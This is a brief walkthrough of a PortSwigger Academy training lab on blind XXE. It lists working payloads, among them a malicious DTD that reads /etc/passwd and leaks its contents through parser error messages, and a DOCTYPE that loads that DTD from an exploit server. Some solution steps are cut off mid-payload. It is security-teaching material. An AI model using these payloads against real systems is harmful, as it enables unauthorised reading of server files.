# Lab: Exploiting blind XXE to retrieve data via error messages

**Official lab:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

**Lab idea:** The stock-check feature parses XML without returning parsed values. The challenge is to understand how a blind XXE condition can disclose data through a deliberately triggered parser error, practicing error-based assessment when direct entity output is unavailable.

## Vulnerability in brief
XML external entity (XXE) injection is a vulnerability in applications that process attacker-influenced XML. When an XML parser resolves externally defined entities, the application may be made to access local files or issue network requests using the server's own access and network position. Whether data is exposed directly depends on how the application handles parsed values and errors.

## Solution idea
1. Click "Go to exploit server" and save the following malicious DTD file on your server: <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM…
2. Click "View exploit" and take a note of the URL for your malicious DTD.
3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD.
4. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]> You should see an…

## Payloads / key values
- `<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> %eval; %exfil;`
- `/etc/passwd`
- `file`
- `stockCheck`
- `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

## Official source
- [PortSwigger Academy: Lab: Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
